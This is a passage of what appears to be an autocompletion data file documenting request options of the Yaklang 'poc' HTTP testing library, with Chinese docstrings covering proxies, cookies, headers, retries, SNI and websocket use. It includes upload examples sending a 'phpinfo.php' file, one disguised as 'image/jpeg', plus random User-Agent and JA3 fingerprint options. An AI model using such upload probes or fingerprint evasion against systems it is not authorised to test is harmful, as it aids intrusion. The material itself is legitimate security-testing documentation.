              'websocket(w bool) PocConfigOption  doc:websocket 是一个请求选项参数，用于允许将链接升级为 websocket，此时发送的请求应该为 websocket 握手请求\n\nExample:\n```\nrsp, req, err = poc.HTTP(`GET / HTTP/1.1\nConnection: Upgrade\nUpgrade: websocket\nSec-Websocket-Version: 13\nSec-Websocket-Extensions: permessage-deflate; client_max_window_bits\nHost: echo.websocket.events\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7\nSec-Websocket-Key: L31R1As+71fwuXqhwhABuA==`,\n\n\tpoc.proxy("http://127.0.0.1:7890"), poc.websocketFromServer(func(rsp, cancel) {\n\t\t    dump(rsp)\n\t\t}), poc.websocketOnClient(func(c) {\n\t\t    c.WriteText("123")\n\t\t}), poc.websocket(true),\n\n)\ntime.Sleep(100)\n```\n',
          },
          {
            functionName: "username(${1:username /*type: string*/})",
            document: "",
            definitionStr:
              'username(username string) PocConfigOption  doc:username 是一个请求选项参数，用于指定认证时的用户名\n\nExample:\n```\npoc.Get("https://www.example.com", poc.username("admin"), poc.password("admin"))\n```\n',
          },
          {
            functionName: "timeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr:
              'timeout(f float64) PocConfigOption  doc:timeout 是一个请求选项参数，用于指定读取超时时间，默认为15秒\n\nExample:\n```\npoc.Get("https://www.example.com", poc.timeout(15)) // 向 www.baidu.com 发起请求，读取超时时间为15秒\n```\n',
          },
          {
            functionName: "source(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'source(i string) PocConfigOption  doc:source 是一个请求选项参数，用于在请求记录保存到数据库时标识此次请求的来源\n\nExample:\n```\npoc.Get("https://exmaple.com", poc.save(true), poc.source("test")) // 向 example.com 发起请求，会将此次请求保存到数据库中，指示此次请求的来源为test\n```\n',
          },
          {
            functionName: "sni(${1:sni /*type: string*/})",
            document: "",
            definitionStr:
              'sni(sni string) PocConfigOption  doc:sni 是一个请求选项参数，用于指定使用 tls(https) 协议时的 服务器名称指示(SNI)\n\nExample:\n```\npoc.Get("https://www.example.com", poc.sni("google.com"))\n```\n',
          },
          {
            functionName: "session(${1:i})",
            document: "",
            definitionStr:
              'session(i any) PocConfigOption  doc:session 是一个请求选项参数，用于指定请求的session，参数可以是任意类型的值，用此值做标识符从而找到唯一的session。使用session进行请求时会自动管理cookie，这在登录后操作的场景非常有用\n\nExample:\n```\npoc.Get("https://pie.dev/cookies/set/AAA/BBB", poc.session("test")) // 向 pie.dev 发起第一次请求，这会设置一个名为AAA，值为BBB的cookie\nrsp, req, err = poc.Get("https://pie.dev/cookies", poc.session("test")) // 向 pie.dev 发起第二次请求，这个请求会输出所有的cookies，可以看到第一次请求设置的cookie已经存在了\n```\n',
          },
          {
            functionName: "saveSync(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'saveSync(b bool) PocConfigOption  doc:saveSync 是一个请求选项参数，用于指定是否将此次请求的记录保存在数据库中，且同步保存，默认为false即会异步保存到数据库\n\nExample:\n```\npoc.Get("https://exmaple.com", poc.save(true), poc.saveSync(true)) // 向 example.com 发起请求，会将此次请求保存到数据库中，且同步保存\n```\n',
          },
          {
            functionName:
              "saveHandler(${1:f /*type: func(response *lowhttp.LowhttpResponse)*/})",
            document: "",
            definitionStr:
              'saveHandler(f func(response *lowhttp.LowhttpResponse)) PocConfigOption  doc:saveHandler 是一个请求选项参数，用于设置在将此次请求存入数据库之前的回调函数\n\nExample:\n```\n\n\tpoc.Get("https://exmaple.com", poc.save(func(resp){\n\t\tresp.Tags = append(resp.Tags,"test")\n\t})) // 向 example.com 发起请求，添加test tag\n\n```\n',
          },
          {
            functionName: "save(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'save(b bool) PocConfigOption  doc:save 是一个请求选项参数，用于指定是否将此次请求的记录保存在数据库中，默认为true即会保存到数据库\n\nExample:\n```\npoc.Get("https://exmaple.com", poc.save(true)) // 向 example.com 发起请求，会将此次请求保存到数据库中\n```\n',
          },
          {
            functionName: "retryWaitTime(${1:f /*type: float64*/})",
            document: "",
            definitionStr:
              "retryWaitTime(f float64) PocConfigOption  doc:retryWaitTime 是一个请求选项参数，用于指定重试时最小等待时间，需要搭配 retryTimes 使用，默认为0.1秒\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.retryTimes(5), poc.retryNotInStatusCode(200), poc.retryWaitTime(0.1)) // 向 example.com 发起请求，如果响应状态码不等于200则进行重试，最多进行5次重试，重试时最小等待0.1秒\n```\n",
          },
          {
            functionName: "retryTimes(${1:t /*type: int*/})",
            document: "",
            definitionStr:
              "retryTimes(t int) PocConfigOption  doc:retryTimes 是一个请求选项参数，用于指定请求失败时的重试次数，需要搭配 retryInStatusCode 或 retryNotInStatusCode 使用，来设置在什么响应码的情况下重试\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.retryTimes(5), poc.retryInStatusCode(500, 502)) // 向 example.com 发起请求，如果响应状态码500或502则进行重试，最多进行5次重试\n```\n",
          },
          {
            functionName: "retryNotInStatusCode(${1:codes...})",
            document: "",
            definitionStr:
              "retryNotInStatusCode(codes ...int) PocConfigOption  doc:retryNotInStatusCode 是一个请求选项参数，用于指定非某些响应状态码的情况下重试，需要搭配 retryTimes 使用\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.retryTimes(5), poc.retryNotInStatusCode(200)) // 向 example.com 发起请求，如果响应状态码不等于200则进行重试，最多进行5次重试\n```\n",
          },
          {
            functionName: "retryMaxWaitTime(${1:f /*type: float64*/})",
            document: "",
            definitionStr:
              "retryMaxWaitTime(f float64) PocConfigOption  doc:retryMaxWaitTime 是一个请求选项参数，用于指定重试时最大等待时间，需要搭配 retryTimes 使用，默认为2秒\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.retryTimes(5), poc.retryNotInStatusCode(200), poc.retryWaitTime(2)) // 向 example.com 发起请求，如果响应状态码不等于200则进行重试，最多进行5次重试，重试时最多等待2秒\n```\n",
          },
          {
            functionName: "retryInStatusCode(${1:codes...})",
            document: "",
            definitionStr:
              "retryInStatusCode(codes ...int) PocConfigOption  doc:retryInStatusCode 是一个请求选项参数，用于指定在某些响应状态码的情况下重试，需要搭配 retryTimes 使用\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.retryTimes(5), poc.retryInStatusCode(500, 502)) // 向 example.com 发起请求，如果响应状态码500或502则进行重试，最多进行5次重试\n```\n",
          },
          {
            functionName: "replaceUserAgent(${1:ua /*type: string*/})",
            document: "",
            definitionStr:
              'replaceUserAgent(ua string) PocConfigOption  doc:replaceUserAgent 是一个请求选项参数，用于改变请求报文，修改 User-Agent 请求头，实际上是replaceHeader("User-Agent", userAgent)的简写\n\nExample:\n```\npoc.Get("https://pie.dev/basic-auth/admin/password", poc.replaceUserAgent("yak-http-client")) // 向 pie.dev 发起请求，修改 User-Agent 请求头为 yak-http-client\n```\n',
          },
          {
            functionName:
              "replaceUploadFile(${1:formName /*type: string*/}, ${2:fileName /*type: string*/}, ${3:fileContent /*type: []byte*/}, ${4:contentType...})",
            document: "",
            definitionStr:
              'replaceUploadFile(formName string, fileName string, fileContent []byte, contentType ...string) PocConfigOption  doc:replaceUploadFile 是一个请求选项参数，用于改变请求报文，修改请求体中的上传的文件，其中第一个参数为表单名，第二个参数为文件名，第三个参数为文件内容，第四个参数是可选参数，为文件类型(Content-Type)，如果不存在则会增加\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.replaceUploadFile("file", "phpinfo.php", "<?php phpinfo(); ?>", "application/x-php")) // 向 pie.dev 发起请求，添加POST请求上传文件，其中file为表单名，phpinfo.php为文件名，<?php phpinfo(); ?>为文件内容，application/x-php为文件类型\n```\n',
          },
          {
            functionName: "replaceRandomUserAgent()",
            document: "",
            definitionStr:
              'replaceRandomUserAgent() PocConfigOption  doc:replaceRandomUserAgent 是一个请求选项参数，用于改变请求报文，修改 User-Agent 请求头为随机的常见请求头\n\nExample:\n```\npoc.Get("https://pie.dev/basic-auth/admin/password", poc.replaceRandomUserAgent()) // 向 pie.dev 发起请求，修改 User-Agent 请求头为随机的常见请求头\n```\n',
          },
          {
            functionName:
              "replaceQueryParam(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'replaceQueryParam(key string, value string) PocConfigOption  doc:replaceQueryParam 是一个请求选项参数，用于改变请求报文，修改 GET 请求参数，如果不存在则会增加\n\nExample:\n```\npoc.Get("https://pie.dev/get", poc.replaceQueryParam("a", "b")) // 向 pie.dev 发起请求，添加GET请求参数a，值为b\n```\n',
          },
          {
            functionName:
              "replacePostParam(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'replacePostParam(key string, value string) PocConfigOption  doc:replacePostParam 是一个请求选项参数，用于改变请求报文，修改 POST 请求参数，如果不存在则会增加\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.replacePostParam("a", "b")) // 向 pie.dev 发起请求，添加POST请求参数a，值为b\n```\n',
          },
          {
            functionName: "replacePath(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'replacePath(path string) PocConfigOption  doc:replacePath 是一个请求选项参数，用于改变请求报文，修改请求路径\n\nExample:\n```\npoc.Get("https://pie.dev/post", poc.replacePath("/get")) // 向 pie.dev 发起请求，实际上请求路径为/get\n```\n',
          },
          {
            functionName: "replaceMethod(${1:method /*type: string*/})",
            document: "",
            definitionStr:
              'replaceMethod(method string) PocConfigOption  doc:replaceMethod 是一个请求选项参数，用于改变请求报文，修改请求方法\n\nExample:\n```\npoc.Options("https://exmaple.com", poc.replaceMethod("GET")) // 向 example.com 发起请求，修改请求方法为GET\n```\n',
          },
          {
            functionName: "replaceHost(${1:host /*type: string*/})",
            document: "",
            definitionStr:
              'replaceHost(host string) PocConfigOption  doc:replaceHost 是一个请求选项参数，用于改变请求报文，修改Host请求头，如果不存在则会增加，实际上是replaceHeader("Host", host)的简写\n\nExample:\n```\npoc.Get("https://yaklang.com/", poc.replaceHost("www.yaklang.com")) // 向 yaklang.com 发起请求，修改Host请求头的值为 www.yaklang.com\n```\n',
          },
          {
            functionName:
              "replaceHeader(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'replaceHeader(key string, value string) PocConfigOption  doc:replaceHeader 是一个请求选项参数，用于改变请求报文，修改修改请求头，如果不存在则会增加\n\nExample:\n```\npoc.Get("https://pie.dev/get", poc.replaceHeader("AAA", "BBB")) // 向 pie.dev 发起请求，修改AAA请求头的值为BBB，这里没有AAA请求头，所以会增加该请求头\n```\n',
          },
          {
            functionName:
              "replaceFormEncoded(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'replaceFormEncoded(key string, value string) PocConfigOption  doc:replaceFormEncoded 是一个请求选项参数，用于改变请求报文，修改请求体中的表单，如果不存在则会增加\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.replaceFormEncoded("aaa", "bbb")) // 向 pie.dev 发起请求，添加POST请求表单，其中aaa为键，bbb为值\n```\n',
          },
          {
            functionName: "replaceFirstLine(${1:firstLine /*type: string*/})",
            document: "",
            definitionStr:
              'replaceFirstLine(firstLine string) PocConfigOption  doc:replaceFirstLine 是一个请求选项参数，用于改变请求报文，修改第一行（即请求方法，请求路径，协议版本）\n\nExample:\n```\npoc.Get("https://exmaple.com", poc.replaceFirstLine("GET /test HTTP/1.1")) // 向 example.com 发起请求，修改请求报文的第一行，请求/test路径\n```\n',
          },
          {
            functionName: "replaceCookies(${1:cookies})",
            document: "",
            definitionStr:
              'replaceCookies(cookies any) PocConfigOption  doc:replaceAllCookies 是一个请求选项参数，用于改变请求报文，修改所有Cookie请求头中的值\n\nExample:\n```\npoc.Get("https://pie.dev/get", poc.replaceAllCookies({"aaa":"bbb", "ccc":"ddd"})) // 向 pie.dev 发起请求，修改aaa的cookie值为bbb，修改ccc的cookie值为ddd\n```\n',
          },
          {
            functionName:
              "replaceCookie(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'replaceCookie(key string, value string) PocConfigOption  doc:replaceCookie 是一个请求选项参数，用于改变请求报文，修改Cookie请求头中的值，如果不存在则会增加\n\nExample:\n```\npoc.Get("https://pie.dev/get", poc.replaceCookie("aaa", "bbb")) // 向 pie.dev 发起请求，这里没有aaa的cookie值，所以会增加\n```\n',
          },
          {
            functionName:
              "replaceBody(${1:body /*type: []byte*/}, ${2:chunk /*type: bool*/})",
            document: "",
            definitionStr:
              'replaceBody(body []byte, chunk bool) PocConfigOption  doc:replaceBody 是一个请求选项参数，用于改变请求报文，修改请求体内容，第一个参数为修改后的请求体内容，第二个参数为是否分块传输\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.replaceBody("a=b", false)) // 向 pie.dev 发起请求，修改请求体内容为a=b\n```\n',
          },
          {
            functionName:
              "replaceBasicAuth(${1:username /*type: string*/}, ${2:password /*type: string*/})",
            document: "",
            definitionStr:
              'replaceBasicAuth(username string, password string) PocConfigOption  doc:replaceBasicAuth 是一个请求选项参数，用于改变请求报文，修改 Authorization 请求头为基础认证的密文，如果不存在则会增加，实际上是replaceHeader("Authorization", codec.EncodeBase64(username + ":" + password))的简写\n\nExample:\n```\npoc.Get("https://pie.dev/basic-auth/admin/password", poc.replaceBasicAuth("admin", "password")) // 向 pie.dev 发起请求进行基础认证，会得到200响应状态码\n```\n',
          },
          {
            functionName:
              "replaceAllQueryParamsWithoutEscape(${1:values /*type: map[string]string*/})",
            document: "",
            definitionStr:
              'replaceAllQueryParamsWithoutEscape(values map[string]string) PocConfigOption  doc:replaceAllQueryParamsWithoutEscape 是一个请求选项参数，用于改变请求报文，修改所有 GET 请求参数，如果不存在则会增加，其接收一个map[string]string 类型的参数，其中 key 为请求参数名，value 为请求参数值\n\n与 poc.replaceAllQueryParams 类似，但是不会将参数值进行转义\n\nExample:\n```\npoc.Get("https://pie.dev/get", poc.replaceAllQueryParamsWithoutEscape({"a":"{{}}", "c":"%%"})) // 向 pie.dev 发起请求，添加GET请求参数a，值为{{}}，添加GET请求参数c，值为%%\n```\n',
          },
          {
            functionName:
              "replaceAllQueryParams(${1:values /*type: map[string]string*/})",
            document: "",
            definitionStr:
              'replaceAllQueryParams(values map[string]string) PocConfigOption  doc:replaceAllQueryParams 是一个请求选项参数，用于改变请求报文，修改所有 GET 请求参数，如果不存在则会增加，其接收一个map[string]string 类型的参数，其中 key 为请求参数名，value 为请求参数值\n\nExample:\n```\npoc.Get("https://pie.dev/get", poc.replaceAllQueryParams({"a":"b", "c":"d"})) // 向 pie.dev 发起请求，添加GET请求参数a，值为b，添加GET请求参数c，值为d\n```\n',
          },
          {
            functionName:
              "replaceAllPostParamsWithoutEscape(${1:values /*type: map[string]string*/})",
            document: "",
            definitionStr:
              'replaceAllPostParamsWithoutEscape(values map[string]string) PocConfigOption  doc:replaceAllPostParamsWithoutEscape 是一个请求选项参数，用于改变请求报文，修改所有POST请求参数，如果不存在则会增加，其接收一个map[string]string类型的参数，其中key为POST请求参数名，value为POST请求参数值\n\n与 poc.replaceAllPostParams 类似，但是不会将参数值进行转义\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.replaceAllPostParamsWithoutEscape({"a":"{{}}", "c":"%%"})) // 向 pie.dev 发起请求，添加POST请求参数a，值为{{}}，POST请求参数c，值为%%\n```\n',
          },
          {
            functionName:
              "replaceAllPostParams(${1:values /*type: map[string]string*/})",
            document: "",
            definitionStr:
              'replaceAllPostParams(values map[string]string) PocConfigOption  doc:replaceAllPostParams 是一个请求选项参数，用于改变请求报文，修改所有POST请求参数，如果不存在则会增加，其接收一个map[string]string类型的参数，其中key为POST请求参数名，value为POST请求参数值\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.replaceAllPostParams({"a":"b", "c":"d"})) // 向 pie.dev 发起请求，添加POST请求参数a，值为b，POST请求参数c，值为d\n```\n',
          },
          {
            functionName: "redirectTimes(${1:t /*type: int*/})",
            document: "",
            definitionStr:
              "redirectTimes(t int) PocConfigOption  doc:redirectTimes 是一个请求选项参数，用于指定最大重定向次数，默认为5次\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.redirectTimes(5)) // 向 example.com 发起请求，如果响应重定向到其他链接，则会自动跟踪重定向最多5次\n```\n",
          },
          {
            functionName:
              "redirectHandler(${1:i /*type: func(isHttps bool, req, rsp []byte) bool*/})",
            document: "",
            definitionStr:
              'redirectHandler(i func(isHttps bool, req, rsp []byte) bool) PocConfigOption  doc:redirectHandler 是一个请求选项参数，用于作为重定向处理函数，如果设置了该选项，则会在重定向时调用该函数，如果该函数返回 true，则会继续重定向，否则不会重定向。其第一个参数为是否使用 https 协议，第二个参数为原始请求报文，第三个参数为原始响应报文\n\nExample:\n```\ncount = 3\npoc.Get("https://pie.dev/redirect/5", poc.redirectHandler(func(https, req, rsp) {\ncount--\nreturn count >= 0\n})) // 向 pie.edv 发起请求，使用自定义 redirectHandler 函数，使用 count 控制，进行最多3次重定向\n```\n',
          },
          {
            functionName: "randomJA3(${1:b /*type: bool*/})",
            document: "",
            definitionStr: "randomJA3(b bool) PocConfigOption",
          },
          {
            functionName: "proxy(${1:proxies...})",
            document: "",
            definitionStr:
              'proxy(proxies ...string) PocConfigOption  doc:proxy 是一个请求选项参数，用于指定请求使用的代理，可以指定多个代理，默认会使用系统代理\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.proxy("http://127.0.0.1:7890")) // 向 example.com 发起请求，使用 http://127.0.0.1:7890 代理\n```\n',
          },
          {
            functionName: "port(${1:port /*type: int*/})",
            document: "",
            definitionStr:
              'port(port int) PocConfigOption  doc:port 是一个请求选项参数，用于指定实际请求的端口，如果没有设置该请求选项，则会依据原始请求报文中的Host字段来确定实际请求的端口\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.host("yaklang.com"), poc.port(443), poc.https(true)) // 实际上请求 yaklang.com 的443端口\n```\n',
          },
          {
            functionName: "password(${1:password /*type: string*/})",
            document: "",
            definitionStr:
              'password(password string) PocConfigOption  doc:password 是一个请求选项参数，用于指定认证时的密码\n\nExample:\n```\npoc.Get("https://www.example.com", poc.username("admin"), poc.password("admin"))\n```\n',
          },
          {
            functionName: "params(${1:i})",
            document: "",
            definitionStr:
              'params(i any) PocConfigOption  doc:params 是一个请求选项参数，用于在请求时使用传入的值，需要注意的是，它可以很方便地使用 `str.f()`或 f-string 代替\n\nExample:\nrsp, req, err = poc.HTTP(x`POST /post HTTP/1.1\nContent-Type: application/json\nHost: pie.dev\n\n{"key": "{{params(a)}}"}`, poc.params({"a":"bbb"})) // 实际上发送的POST参数为{"key": "bbb"}\n',
          },
          {
            functionName: "noRedirect(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              "noRedirect(b bool) PocConfigOption  doc:noRedirect 是一个请求选项参数，用于指定是否跟踪重定向，默认为 false 即会自动跟踪重定向\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.noRedirect()) // 向 example.com 发起请求，如果响应重定向到其他链接也不会自动跟踪重定向\n```\n",
          },
          {
            functionName: "noFixContentLength(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              "noFixContentLength(b bool) PocConfigOption  doc:noFixContentLength 是一个请求选项参数，用于指定是否修复响应报文中的 Content-Length 字段，默认为 false 即会自动修复Content-Length字段\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.noFixContentLength()) // 向 example.com 发起请求，如果响应报文中的Content-Length字段不正确或不存在\t也不会自动修复\n```\n",
          },
          {
            functionName: "jsRedirect(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              "jsRedirect(b bool) PocConfigOption  doc:jsRedirect 是一个请求选项参数，用于指定是否跟踪JS重定向，默认为false即不会自动跟踪JS重定向\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.redirectTimes(5), poc.jsRedirect(true)) // 向 www.baidu.com 发起请求，如果响应重定向到其他链接也会自动跟踪JS重定向，最多进行5次重定向\n```\n",
          },
          {
            functionName: "https(${1:isHttps /*type: bool*/})",
            document: "",
            definitionStr:
              "https(isHttps bool) PocConfigOption  doc:https 是一个请求选项参数，用于指定是否使用 https 协议，默认为 false 即使用 http 协议\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.https(true)) // 向 example.com 发起请求，使用 https 协议\n```\n",
          },
          {
            functionName: "http2(${1:isHttp2 /*type: bool*/})",
            document: "",
            definitionStr:
              'http2(isHttp2 bool) PocConfigOption  doc:http2 是一个请求选项参数，用于指定是否使用 http2 协议，默认为 false 即使用http1协议\n\nExample:\n```\npoc.Get("https://www.example.com", poc.http2(true), poc.https(true)) // 向 www.example.com 发起请求，使用 http2 协议\n```\n',
          },
          {
            functionName: "host(${1:h /*type: string*/})",
            document: "",
            definitionStr:
              'host(h string) PocConfigOption  doc:host 是一个请求选项参数，用于指定实际请求的 host，如果没有设置该请求选项，则会依据原始请求报文中的Host字段来确定实际请求的host\n\nExample:\n```\npoc.HTTP(poc.BasicRequest(), poc.host("yaklang.com")) // 实际上请求 yaklang.com\n```\n',
          },
          {
            functionName: "dnsServer(${1:servers...})",
            document: "",
            definitionStr:
              'dnsServer(servers ...string) PocConfigOption  doc:dnsServer 是一个请求选项参数，用于指定请求所使用的DNS服务器，默认使用系统自带的DNS服务器\n\nExample:\n```\n// 向 example.com 发起请求，使用指定的DNS服务器\npoc.Get("https://exmaple.com", poc.dnsServer("8.8.8.8", "1.1.1.1"))\n```\n',
          },
          {
            functionName: "dnsNoCache(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'dnsNoCache(b bool) PocConfigOption  doc:dnsNoCache 是一个请求选项参数，用于指定请求时不使用DNS缓存，默认使用DNS缓存\n\nExample:\n```\n// 向 example.com 发起请求，不使用DNS缓存\npoc.Get("https://exmaple.com", poc.dnsNoCache(true))\n```\n',
          },
          {
            functionName: "deleteQueryParam(${1:key /*type: string*/})",
            document: "",
            definitionStr:
              'deleteQueryParam(key string) PocConfigOption  doc:deleteQueryParam 是一个请求选项参数，用于改变请求报文，删除 GET 请求参数\n\nExample:\n```\npoc.HTTP(`GET /get?a=b&c=d HTTP/1.1\nContent-Type: application/json\nHost: pie.dev\n\n`, poc.deleteQueryParam("a")) // 向 pie.dev 发起请求，删除GET请求参数a\n```\n',
          },
          {
            functionName: "deletePostParam(${1:key /*type: string*/})",
            document: "",
            definitionStr:
              'deletePostParam(key string) PocConfigOption  doc:deletePostParam 是一个请求选项参数，用于改变请求报文，删除 POST 请求参数\n\nExample:\n```\npoc.HTTP(`POST /post HTTP/1.1\nContent-Type: application/json\nContent-Length: 7\nHost: pie.dev\n\na=b&c=d`, poc.deletePostParam("a")) // 向 pie.dev 发起请求，删除POST请求参数a\n```\n',
          },
          {
            functionName: "deleteHeader(${1:key /*type: string*/})",
            document: "",
            definitionStr:
              'deleteHeader(key string) PocConfigOption  doc:deleteHeader 是一个请求选项参数，用于改变请求报文，删除请求头\n\nExample:\n```\npoc.HTTP(`GET /get HTTP/1.1\nContent-Type: application/json\nAAA: BBB\nHost: pie.dev\n\n`, poc.deleteHeader("AAA"))// 向 pie.dev 发起请求，删除AAA请求头\n```\n',
          },
          {
            functionName: "deleteForm(${1:key /*type: string*/})",
            document: "",
            definitionStr:
              'deleteForm(key string) PocConfigOption  doc:deleteForm 是一个请求选项参数，用于改变请求报文，删除 POST 请求表单\n\nExample:\n```\npoc.HTTP(`POST /post HTTP/1.1\nHost: pie.dev\nContent-Type: multipart/form-data; boundary=------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Length: 308\n\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Disposition: form-data; name="aaa"\n\nbbb\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm\nContent-Disposition: form-data; name="ccc"\n\nddd\n--------------------------OFHnlKtUimimGcXvRSxgCZlIMAyDkuqsxeppbIFm--`, poc.deleteForm("aaa")) // 向 pie.dev 发起请求，删除POST请求表单aaa\n```\n',
          },
          {
            functionName: "deleteCookie(${1:key /*type: string*/})",
            document: "",
            definitionStr:
              'deleteCookie(key string) PocConfigOption  doc:deleteCookie 是一个请求选项参数，用于改变请求报文，删除 Cookie 中的值\n\nExample:\n```\npoc.HTTP(`GET /get HTTP/1.1\nContent-Type: application/json\nCookie: aaa=bbb; ccc=ddd\nHost: pie.dev\n\n`, poc.deleteCookie("aaa"))// 向 pie.dev 发起请求，删除Cookie中的aaa\n```\n',
          },
          {
            functionName: "context(${1:ctx /*type: context.Context*/})",
            document: "",
            definitionStr:
              'context(ctx context.Context) PocConfigOption  doc:context 是一个请求选项参数，用于指定请求的上下文\n\nExample:\n```\nctx = context.New()\npoc.Get("https://exmaple.com", poc.withContext(ctx)) // 向 example.com 发起请求，使用指定的上下文\n```\n',
          },
          {
            functionName: "connectTimeout(${1:f /*type: float64*/})",
            document: "",
            definitionStr:
              'connectTimeout(f float64) PocConfigOption  doc:connectTimeout 是一个请求选项参数，用于指定连接超时时间，默认为15秒\n\nExample:\n```\npoc.Get("https://www.example.com", poc.timeout(15)) // 向 www.baidu.com 发起请求，读取超时时间为15秒\n```\n',
          },
          {
            functionName: "connPool(${1:b /*type: bool*/})",
            document: "",
            definitionStr:
              'connPool(b bool) PocConfigOption  doc:connPool 是一个请求选项参数，用于指定是否使用连接池，默认不使用连接池\n\nExample:\n```\nrsp, req, err = poc.HTTP(x`POST /post HTTP/1.1\nContent-Type: application/json\nHost: pie.dev\n\n{"key": "asd"}`, poc.connPool(true)) // 使用连接池发送请求，这在发送多个请求时非常有用\n```\n',
          },
          {
            functionName:
              "appendUploadFile(${1:fieldName /*type: string*/}, ${2:fileName /*type: string*/}, ${3:fileContent}, ${4:contentType...})",
            document: "",
            definitionStr:
              'appendUploadFile(fieldName string, fileName string, fileContent any, contentType ...string) PocConfigOption  doc:appendUploadFile 是一个请求选项参数，用于改变请求报文，添加请求体中的上传的文件，其中第一个参数为表单名，第二个参数为文件名，第三个参数为文件内容，第四个参数是可选参数，为文件类型(Content-Type)\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.appendUploadFile("file", "phpinfo.php", "<?php phpinfo(); ?>", "image/jpeg"))// 向 pie.dev 发起请求，添加POST请求表单，其文件名为phpinfo.php，内容为<?php phpinfo(); ?>，文件类型为image/jpeg\n```\n',
          },
          {
            functionName:
              "appendQueryParam(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'appendQueryParam(key string, value string) PocConfigOption  doc:appendQueryParam 是一个请求选项参数，用于改变请求报文，添加 GET 请求参数\n\nExample:\n```\npoc.Get("https://pie.dev/get", poc.appendQueryParam("a", "b")) // 向 pie.dev 发起请求，添加GET请求参数a，值为b\n```\n',
          },
          {
            functionName:
              "appendPostParam(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'appendPostParam(key string, value string) PocConfigOption  doc:appendPostParam 是一个请求选项参数，用于改变请求报文，添加 POST 请求参数\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.appendPostParam("a", "b")) // 向 pie.dev 发起请求，添加POST请求参数a，值为b\n```\n',
          },
          {
            functionName: "appendPath(${1:path /*type: string*/})",
            document: "",
            definitionStr:
              'appendPath(path string) PocConfigOption  doc:appendPath 是一个请求选项参数，用于改变请求报文，在现有请求路径后添加请求路径\n\nExample:\n```\npoc.Get("https://yaklang.com/docs", poc.appendPath("/api/poc")) // 向 yaklang.com 发起请求，实际上请求路径为/docs/api/poc\n```\n',
          },
          {
            functionName:
              "appendHeaders(${1:headers /*type: map[string]string*/})",
            document: "",
            definitionStr:
              'appendHeaders(headers map[string]string) PocConfigOption  doc:appendHeaders 是一个请求选项参数，用于改变请求报文，添加请求头\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.appendHeaders({"AAA": "BBB","CCC": "DDD"})) // 向 pie.dev 发起请求，添加AAA请求头的值为BBB\n```\n',
          },
          {
            functionName:
              "appendHeader(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'appendHeader(key string, value string) PocConfigOption  doc:appendHeader 是一个请求选项参数，用于改变请求报文，添加请求头\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.appendHeader("AAA", "BBB")) // 向 pie.dev 发起请求，添加AAA请求头的值为BBB\n```\n',
          },
          {
            functionName:
              "appendFormEncoded(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'appendFormEncoded(key string, value string) PocConfigOption  doc:appendFormEncoded 是一个请求选项参数，用于改变请求报文，添加请求体中的表单\n\nExample:\n```\npoc.Post("https://pie.dev/post", poc.appendFormEncoded("aaa", "bbb")) // 向 pie.dev 发起请求，添加POST请求表单，其中aaa为键，bbb为值\n```\n',
          },
          {
            functionName:
              "appendCookie(${1:key /*type: string*/}, ${2:value /*type: string*/})",
            document: "",
            definitionStr:
              'appendCookie(key string, value string) PocConfigOption  doc:appendCookie 是一个请求选项参数，用于改变请求报文，添加 Cookie 请求头中的值\n\nExample:\n```\npoc.Get("https://pie.dev/get", poc.appendCookie("aaa", "bbb")) // 向 pie.dev 发起请求，添加cookie键值对aaa:bbb\n```\n',
          },
          {
            functionName: "Websocket(${1:raw}, ${2:opts...})",
            document: "",
            definitionStr:
